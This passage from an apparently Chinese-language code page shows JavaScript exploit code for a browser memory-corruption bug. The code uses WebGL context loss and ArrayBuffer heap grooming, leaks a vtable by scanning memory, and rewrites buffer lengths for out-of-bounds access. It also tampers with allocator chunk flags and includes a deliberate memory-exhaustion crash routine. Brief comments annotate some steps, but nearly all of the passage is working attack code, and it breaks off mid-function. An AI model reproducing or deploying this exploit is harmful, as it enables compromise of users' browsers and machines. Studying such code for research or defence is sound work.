class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"?"</span>&gt;---------&lt;/a&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'?'</span> + <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">window</span>.location + <span class="string">''</span>).indexOf(time) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.location = time;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="string">'Ready.\nThis is a Slow Exploit.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nooo = [];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        nooo.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert = print;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制将ArrayBuffer转换为native wrapper，用于后面修改其长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This WebGL stuff is just to force an ArrayBuffer or ArrayBufferView to</span></span><br><span class="line"><span class="comment">// create a native wrapper, hopefully without allocating anything else (to</span></span><br><span class="line"><span class="comment">// simplify assumptions).</span></span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">gl = canvas.getContext(<span class="string">"webgl"</span>) || canvas.getContext(<span class="string">"experimental-webgl"</span>);</span><br><span class="line"><span class="keyword">if</span>(!gl) &#123;</span><br><span class="line">    alert(<span class="string">'no webgl'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ext = gl.getExtension(<span class="string">'WEBGL_lose_context'</span>);</span><br><span class="line"><span class="keyword">if</span>(!ext) &#123;</span><br><span class="line">    alert(<span class="string">'no lose_context'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">ext.loseContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">force</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    gl.bufferData(<span class="number">0</span>, buffer, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> thingiesToFree = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForce = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForceEarly = [];</span><br><span class="line"><span class="keyword">var</span> viewsToForceEarly = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    buffersToForce.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">4097</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x52</span>);</span><br><span class="line">        force(buf);</span><br><span class="line">        buffersToForceEarly.push(buf);</span><br><span class="line">        <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf, <span class="number">0</span>, <span class="number">0x51</span>);</span><br><span class="line">        force(view);</span><br><span class="line">        viewsToForceEarly.push(view);</span><br><span class="line">    &#125;</span><br><span class="line">    thingiesToFree.push([]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hexChars = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asHex</span>(<span class="params">num, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(len === <span class="literal">undefined</span>)</span><br><span class="line">        len = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.log(num)/<span class="built_in">Math</span>.log(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        s += hexChars[(num &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xf</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexDump</span>(<span class="params">off, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = off; i &lt; off + len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != off) s += <span class="string">'\n'</span>;</span><br><span class="line">            s += <span class="string">'+'</span> + asHex(i, <span class="number">8</span>) + <span class="string">':'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += <span class="string">' '</span> + asHex(read8(i), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pre</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'pre'</span>);</span><br><span class="line">    el.innerHTML = s;</span><br><span class="line">    <span class="built_in">document</span>.documentElement.appendChild(el);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sniffAroundInHeap</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'+1'</span>);</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">//ary[0x7eadbeef];</span></span><br><span class="line">    <span class="keyword">var</span> haveVtable = <span class="literal">false</span>, haveBuffers = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ary.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!haveVtable &amp;&amp; ary[i] == <span class="number">0x51</span>) &#123;</span><br><span class="line">            <span class="comment">// this is DataView+0x20, from which we get the vtable</span></span><br><span class="line">            vtable = ary[i - <span class="number">0x20</span>/<span class="number">4</span>];</span><br><span class="line">            <span class="comment">//alert('vtable = ' + vtable);</span></span><br><span class="line">            haveVtable = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveBuffers &lt; <span class="number">2</span> &amp;&amp; ary[i] == <span class="number">0x52</span>) &#123;</span><br><span class="line">            <span class="comment">// this is ArrayBuffer+8, from which we create predictable windows</span></span><br><span class="line">            <span class="comment">// onto memory Why does changing this number affect behavior (v8</span></span><br><span class="line">            <span class="comment">// crashes in ShortCircuitConsString in the garbage collector)?</span></span><br><span class="line">            <span class="keyword">if</span>(haveBuffers == <span class="number">0</span>) &#123;</span><br><span class="line">                callbuf = ary[i<span class="number">-1</span>];</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x100</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7fffffff</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x80000000</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7ffffffe</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            haveBuffers++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveVtable &amp;&amp; haveBuffers == <span class="number">2</span>) &#123;</span><br><span class="line">            launderBuffers(buffersToForceEarly, <span class="string">'savedBuffersToForceEarly'</span>, prepareForCalls);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"didn't find the things"</span>);</span><br><span class="line">    crash();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//hexDump(ary, 0, 0x10000);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新wrapper的长度为memory corrupted的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launderBuffers</span>(<span class="params">origBuffers, prop, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Need to get new V8 wrappers that reflect the native object's new</span></span><br><span class="line">    <span class="comment">// m_sizeInBytes</span></span><br><span class="line">    <span class="comment">// alert('launderBuffers - ' + buffersToForce.length);</span></span><br><span class="line">    <span class="comment">// N.B. this doesn't work with MessageChannels for some reason - the</span></span><br><span class="line">    <span class="comment">// ArrayBuffers become null.  My fault or a bug?</span></span><br><span class="line">    <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//alert('onmessage');</span></span><br><span class="line">            <span class="keyword">var</span> buffers = e.data;</span><br><span class="line">            <span class="built_in">window</span>[prop] = buffers;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffers.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> buffer = buffers[i];</span><br><span class="line">                <span class="keyword">if</span>(buffer.byteLength &gt;= <span class="number">0x7ffffffe</span>) &#123;</span><br><span class="line">                    <span class="comment">//alert('buffer ' + i + '.length = ' + buffer.byteLength);</span></span><br><span class="line">                    <span class="keyword">if</span>(callback(buffer))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            alert(<span class="string">'no good buffers found - '</span> + prop);</span><br><span class="line">            crash();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            alert(<span class="string">'lB exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">            crash();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.postMessage(origBuffers, <span class="string">'*'</span>, origBuffers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceWithWTFArrayBuffer</span>(<span class="params">arrays, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextOff = <span class="number">0x20</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="comment">// next should have CINUSE and PINUSE set</span></span><br><span class="line">    arrays[j][nextOff + <span class="number">4</span>] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="comment">// now free it</span></span><br><span class="line">    arrays[j] = <span class="literal">null</span>;</span><br><span class="line">    thingiesToFree = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> thingiesToMake = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffersToForce.length; i++) &#123;</span><br><span class="line">        force(buffersToForce[i]);</span><br><span class="line">        <span class="comment">// try unnecessarily hard to cause a GC</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">1000</span>; k++) &#123;</span><br><span class="line">            thingiesToMake.push([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// time to keep overwriting starting at the WTF::ArrayBuffer + 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) 